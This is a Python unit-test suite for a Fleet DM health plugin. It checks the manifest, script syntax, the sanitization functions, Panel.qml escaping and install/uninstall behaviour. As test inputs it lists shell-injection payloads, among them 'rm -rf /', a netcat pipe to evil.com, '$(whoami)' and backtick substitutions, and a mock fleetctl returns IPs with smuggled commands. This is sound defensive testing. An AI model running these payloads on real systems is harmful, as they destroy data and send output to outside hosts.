#!/usr/bin/env python3
"""
Comprehensive Unit and Functional tests for Fleet DM Health Plugin.
Tests manifest schema, shell syntax, input sanitization, security controls in Panel.qml,
CLI report collector, mock fleetctl data ingestion, and install/uninstall lifecycle.
"""

import unittest
import subprocess
import json
import os
import re
import sys
import tempfile
import shutil
import importlib.util
from pathlib import Path

PLUGIN_DIR = Path(__file__).resolve().parent.parent

# Dynamically import the report script for direct unit testing of sanitization functions
REPORT_BIN = PLUGIN_DIR / "bin" / "omarchy-fleet-health-report"
import importlib.machinery
loader = importlib.machinery.SourceFileLoader("omarchy_fleet_health_report", str(REPORT_BIN))
spec = importlib.util.spec_from_loader("omarchy_fleet_health_report", loader)
report_mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(report_mod)


class TestFleetPlugin(unittest.TestCase):
    def test_manifest_schema(self):
        """Verify manifest.json contains all required Omarchy fields and valid structure."""
        manifest_path = PLUGIN_DIR / "manifest.json"
        self.assertTrue(manifest_path.is_file(), "manifest.json must exist")
        with open(manifest_path, "r", encoding="utf-8") as f:
            manifest = json.load(f)

        self.assertEqual(manifest.get("schemaVersion"), 1)
        self.assertEqual(manifest.get("id"), "fleet.health")
        self.assertEqual(manifest.get("author"), "szaidi-code")
        self.assertEqual(manifest.get("license"), "MIT")
        self.assertIn("bar-widget", manifest.get("kinds", []))
        self.assertIn("barWidget", manifest.get("entryPoints", {}))

        widget_entry = PLUGIN_DIR / manifest["entryPoints"]["barWidget"]
        self.assertTrue(widget_entry.is_file(), f"Entry point {widget_entry} must exist")

    def test_omarchy_plugin_validate(self):
        """Verify the plugin passes official Omarchy CLI validation."""
        res = subprocess.run(["omarchy", "plugin", "validate", str(PLUGIN_DIR)], capture_output=True, text=True)
        self.assertEqual(res.returncode, 0, f"omarchy plugin validate failed: {res.stderr}")

    def test_scripts_syntax(self):
        """Verify bash syntax across all shell scripts."""
        scripts = [
            PLUGIN_DIR / "install.sh",
            PLUGIN_DIR / "uninstall.sh",
            PLUGIN_DIR / "bin" / "omarchy-fleet-status",
        ]
        for script in scripts:
            self.assertTrue(script.is_file(), f"{script} must exist")
            self.assertTrue(os.access(script, os.X_OK), f"{script} must be executable")
            res = subprocess.run(["bash", "-n", str(script)], capture_output=True, text=True)
            self.assertEqual(res.returncode, 0, f"{script.name} bash syntax error: {res.stderr}")

    def test_python_syntax(self):
        """Verify Python scripts compile without syntax errors."""
        py_scripts = [
            REPORT_BIN,
            PLUGIN_DIR / "tests" / "test_plugin.py",
        ]
        for py_file in py_scripts:
            res = subprocess.run([sys.executable, "-m", "py_compile", str(py_file)], capture_output=True, text=True)
            self.assertEqual(res.returncode, 0, f"py_compile error on {py_file}: {res.stderr}")

    def test_sanitize_ip_unit(self):
        """Unit test sanitize_ip against valid IPs/hostnames and malicious injection payloads."""
        # Valid inputs
        self.assertEqual(report_mod.sanitize_ip("192.168.1.1"), "192.168.1.1")
        self.assertEqual(report_mod.sanitize_ip("10.0.1.15"), "10.0.1.15")
        self.assertEqual(report_mod.sanitize_ip("127.0.0.1"), "127.0.0.1")
        self.assertEqual(report_mod.sanitize_ip("fe80::1ff:fe00:1"), "fe80::1ff:fe00:1")
        self.assertEqual(report_mod.sanitize_ip("::1"), "::1")
        self.assertEqual(report_mod.sanitize_ip("node-01.internal"), "node-01.internal")
        self.assertEqual(report_mod.sanitize_ip("  10.0.0.5  "), "10.0.0.5")

        # Malicious shell-injection payloads must be rejected and return "unknown"
        malicious_inputs = [
            "192.168.1.1; rm -rf /",
            "10.0.0.1 && touch /tmp/pwned",
            "10.0.0.1 | nc evil.com 1337",
            "10.0.0.1`id`",
            "$(whoami)",
            "10.0.0.1\nreboot",
            "-rf",
            "--help",
            "-v",
            "; reboot",
            "192.168.1.1' OR '1'='1",
            '192.168.1.1" && echo hi',
            "10.0.0.1 > /dev/null",
            "10.0.0.1 & echo background",
            "",
            None,
            1234,
            "   ",
        ]
        for bad_ip in malicious_inputs:
            self.assertEqual(
                report_mod.sanitize_ip(bad_ip),
                "unknown",
                f"Expected dangerous input {bad_ip!r} to be rejected as 'unknown'",
            )

    def test_sanitize_text_unit(self):
        """Unit test sanitize_text strips control characters and clamps string lengths."""
        self.assertEqual(report_mod.sanitize_text("Normal Text"), "Normal Text")
        self.assertEqual(report_mod.sanitize_text("Text\x00With\x1fControl"), "TextWithControl")
        self.assertEqual(report_mod.sanitize_text("", default="default"), "default")
        self.assertEqual(report_mod.sanitize_text(None, default="fallback"), "fallback")
        long_str = "a" * 300
        self.assertEqual(len(report_mod.sanitize_text(long_str, max_len=50)), 50)

    def test_panel_qml_security_audit(self):
        """Audit Panel.qml to ensure no shell-string concatenation exists and safe APIs are used."""
        panel_path = PLUGIN_DIR / "Panel.qml"
        self.assertTrue(panel_path.is_file(), "Panel.qml must exist")
        with open(panel_path, "r", encoding="utf-8") as f:
            content = f.read()

        # 1. Ensure the vulnerable unquoted shell concatenation is completely gone
        self.assertNotIn('root.bar.run("wl-copy " + val)', content)
        self.assertNotIn("root.bar.run('wl-copy ' + val)", content)
        self.assertNotIn("wl-copy \" + val", content)

        # 2. Ensure allowlist regex is implemented
        self.assertIn("safeValRegex", content)
        self.assertIn("safeLabelRegex", content)

        # 3. Ensure non-shell vector execution is present
        self.assertIn("Quickshell.execDetached", content)
        self.assertIn('"wl-copy", "--"', content)

        # 4. Ensure safe POSIX escaping is present for shell fallback
        self.assertIn("replace(/'/g, \"'\\\\''\")", content)

    def test_demo_report_structure(self):
        """Verify demo report generation produces complete and valid JSON without private leaks."""
        res = subprocess.run([str(REPORT_BIN), "--demo"], capture_output=True, text=True)
        self.assertEqual(res.returncode, 0, f"omarchy-fleet-health-report --demo failed: {res.stderr}")

        data = json.loads(res.stdout)
        self.assertTrue(data.get("connected"))
        self.assertIn("server_url", data)
        self.assertNotIn("192.168", data["server_url"], "Demo mode must not leak private IP")

        summary = data.get("summary", {})
        self.assertEqual(summary.get("total_nodes"), 4)
        self.assertEqual(summary.get("online_nodes"), 4)
        self.assertEqual(summary.get("status"), "Healthy")
        self.assertGreater(summary.get("total_ram_gb", 0), 0)

        nodes = data.get("nodes", [])
        self.assertEqual(len(nodes), 4)

        for node in nodes:
            self.assertIn("id", node)
            self.assertIn("hostname", node)
            self.assertIn("ip", node)
            self.assertNotIn("192.168", node["ip"], "Demo mode node IP must not leak private IP")
            self.assertIn("cpu", node)
            self.assertIn("load_1m", node["cpu"])
            self.assertIn("memory", node)
            self.assertIn("total_mb", node["memory"])
            self.assertIn("used_mb", node["memory"])
            self.assertIn("kernel", node)
            self.assertIn("version", node["kernel"])
            self.assertIn("uptime_human", node["kernel"])

    def test_fleet_status_script(self):
        """Verify status script outputs valid JSON even when fleetctl is unavailable."""
        status_bin = PLUGIN_DIR / "bin" / "omarchy-fleet-status"
        self.assertTrue(status_bin.is_file(), "omarchy-fleet-status binary must exist")

        res = subprocess.run([str(status_bin)], capture_output=True, text=True)
        self.assertEqual(res.returncode, 0, f"omarchy-fleet-status failed: {res.stderr}")
        data = json.loads(res.stdout)
        self.assertIn("connected", data)
        self.assertIn("total_hosts", data)

    def test_status_script_ip_sanitization(self):
        """Functional test verifying omarchy-fleet-status jq filter neutralizes malicious IP values."""
        status_bin = PLUGIN_DIR / "bin" / "omarchy-fleet-status"
        with open(status_bin, "r", encoding="utf-8") as f:
            status_src = f.read()

        # Extract the jq expression
        jq_match = re.search(r"jq\s+-s\s+--arg\s+url\s+\"\$FLEET_SERVER_URL\"\s+'(.*)'\s+<<<", status_src, re.DOTALL)
        self.assertIsNotNone(jq_match, "Failed to find jq expression in omarchy-fleet-status")
        jq_expr = jq_match.group(1)

        # Feed simulated raw_hosts with malicious primary_ip
        mock_raw = json.dumps({
            "spec": {
                "id": 1,
                "hostname": "attacker-node",
                "primary_ip": "10.0.0.1; rm -rf /",
                "status": "online",
            }
        })

        res = subprocess.run(
            ["jq", "-s", "--arg", "url", "https://fleet.test:1337", jq_expr],
            input=mock_raw,
            capture_output=True,
            text=True,
        )
        self.assertEqual(res.returncode, 0, f"jq filtering failed: {res.stderr}")
        out = json.loads(res.stdout)
        self.assertEqual(out["hosts"][0]["ip"], "unknown", "Malicious IP must be replaced by 'unknown'")

    def test_cli_with_mock_fleetctl_in_path(self):
        """Functional test running omarchy-fleet-health-report against mock fleetctl producing injection payloads."""
        with tempfile.TemporaryDirectory() as tmp_bin_dir:
            mock_fleetctl = Path(tmp_bin_dir) / "fleetctl"
            mock_script_content = """#!/bin/bash
if [[ "$*" == *"--version"* ]]; then
  echo "fleetctl version 4.50.0"
  exit 0
elif [[ "$*" == *"get hosts"* ]]; then
  echo '{"spec":{"id":1,"hostname":"test-node","computer_name":"Test Node","primary_ip":"192.168.1.50; rm -rf /","memory":4294967296,"status":"online"}}'
  exit 0
elif [[ "$*" == *"report"* ]]; then
  echo '{"host":"test-node","rows":[{"load_1m":"0.42","load_5m":"0.30","memory_total":4294967296,"memory_free":2147483648,"cached":1073741824,"uptime_seconds":86400,"cpu_brand":"Intel Core i7\\x00pwn","kernel_version":"6.12.10-arch1-1\\nrm"}]}'
  exit 0
fi
exit 1
"""
            mock_fleetctl.write_text(mock_script_content, encoding="utf-8")
            mock_fleetctl.chmod(0o755)

            env = os.environ.copy()
            env["PATH"] = f"{tmp_bin_dir}:{env['PATH']}"

            res = subprocess.run([str(REPORT_BIN)], env=env, capture_output=True, text=True)
            self.assertEqual(res.returncode, 0, f"CLI failed: {res.stderr}")

            data = json.loads(res.stdout)
            self.assertTrue(data.get("connected"), "Report should be marked connected")
            self.assertEqual(len(data.get("nodes", [])), 1)

            node = data["nodes"][0]
            # Primary IP must be sanitized to unknown and NEVER contain the payload
            self.assertEqual(node["ip"], "unknown")
            self.assertNotIn("rm -rf", node["ip"])
            self.assertNotIn(";", node["ip"])

            # CPU and kernel strings must be sanitized of control characters
            self.assertNotIn("\x00", node["cpu"]["brand"])
            self.assertNotIn("\n", node["kernel"]["version"])

    def test_install_and_uninstall_lifecycle(self):
        """Functional test for install.sh and uninstall.sh in an isolated sandbox HOME."""
        with tempfile.TemporaryDirectory() as tmp_home:
            env = os.environ.copy()
            env["HOME"] = tmp_home
            env["PREFIX"] = f"{tmp_home}/.local/bin"

            # 1. Run install.sh
            res_install = subprocess.run(
                ["bash", str(PLUGIN_DIR / "install.sh")],
                env=env,
                capture_output=True,
                text=True,
            )
            self.assertEqual(res_install.returncode, 0, f"install.sh failed: {res_install.stderr}")

            installed_plugin_dir = Path(tmp_home) / ".config" / "omarchy" / "plugins" / "fleet.health"
            self.assertTrue(installed_plugin_dir.is_dir(), "Plugin directory was not created")
            self.assertTrue((installed_plugin_dir / "Panel.qml").is_file(), "Panel.qml not installed")
            self.assertTrue((installed_plugin_dir / "manifest.json").is_file(), "manifest.json not installed")
            self.assertTrue((Path(tmp_home) / ".local" / "bin" / "omarchy-fleet-health-report").is_file())
            self.assertTrue((Path(tmp_home) / ".local" / "bin" / "omarchy-fleet-status").is_file())

            # 2. Run uninstall.sh
            res_uninstall = subprocess.run(
                ["bash", str(PLUGIN_DIR / "uninstall.sh")],
                env=env,
                capture_output=True,
                text=True,
            )
            self.assertEqual(res_uninstall.returncode, 0, f"uninstall.sh failed: {res_uninstall.stderr}")
            self.assertFalse(installed_plugin_dir.exists(), "Plugin directory was not removed by uninstall.sh")
            self.assertFalse((Path(tmp_home) / ".local" / "bin" / "omarchy-fleet-health-report").exists())
            self.assertFalse((Path(tmp_home) / ".local" / "bin" / "omarchy-fleet-status").exists())


if __name__ == "__main__":
    unittest.main()
